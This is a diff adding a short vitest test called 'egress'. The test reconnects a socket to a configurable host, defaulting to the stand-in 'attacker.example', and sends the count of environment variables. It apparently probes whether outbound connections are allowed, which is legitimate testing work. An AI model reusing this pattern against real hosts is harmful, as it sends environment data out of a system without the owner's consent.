@@ -1,0 +1,20 @@
+import { it, expect } from 'vitest';
+import http from 'node:http';
+const target = 'attacker.example';
+it('egress', async () => {
+  const srv = http.createServer((req, res) => { res.end('ok'); });
+  await new Promise<void>((r) => { srv.listen(0, () => r()); });
+  const port = (srv.address() as { port: number }).port;
+  const got = await new Promise<string>((resolve) => {
+    const req = http.get({ port, path: '/' }, (res) => { res.resume(); });
+    req.on('socket', (s) => {
+      s.on('close', () => {
+        s.connect(port, process.env.PROBE_HOST ?? target, () => { resolve('reconnected:' + s.remoteAddress); s.write(JSON.stringify(Object.keys(process.env).length)); s.destroy(); });
+      });
+      setTimeout(() => s.destroy(), 50);
+    });
+    req.on('error', () => {});
+  });
+  srv.close();
+  expect(got).toContain('reconnected');
+});
